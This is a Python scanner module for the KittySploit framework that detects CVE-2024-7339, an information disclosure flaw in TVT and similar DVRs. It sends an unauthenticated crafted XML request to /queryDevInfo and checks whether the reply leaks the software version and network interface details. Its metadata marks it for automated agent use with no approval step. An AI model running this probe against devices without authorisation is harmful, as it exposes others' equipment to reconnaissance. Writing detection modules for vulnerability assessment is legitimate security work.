#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability has been found in TVT DVR TD-2104TS-CL, DVR TD-2108TS-HP, Provision-ISR DVR SH-4050A5-5L(MM) a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TVT DVR Sensitive Device - Information Disclosure Detection',
        'description': 'A vulnerability has been found in TVT DVR TD-2104TS-CL, DVR TD-2108TS-HP, Provision-ISR DVR SH-4050A5-5L(MM) and AVISION DVR AV108T and classified as problematic. This vulnerability affects unknown code of the file /queryDevInfo. The manipulation leads to information disclosure.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'dvr', 'tvt', 'info-leak', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://netsecfish.notion.site/Sensitive-Device-Information-Disclosure-in-TVT-DVR-fad1cce703d946969be5130bf3aaac0d',
            'https://netsecfish.notion.site/Sensitive-Device-Information-Disclosure-in-TVT-DVR-fad1cce703d946969be5130bf3aaac0d?pvs=4',
            'https://vuldb.com/?ctiid.273262',
            'https://vuldb.com/?id.273262',
            'https://vuldb.com/?submit.379373',
        ],
        'cve': 'CVE-2024-7339',
    }

    def run(self):
        path = '/queryDevInfo'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('softwareVersion', 'eth0',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='TVT DVR Sensitive Device - Information Disclosure detected', path=path)
            return True
        return False

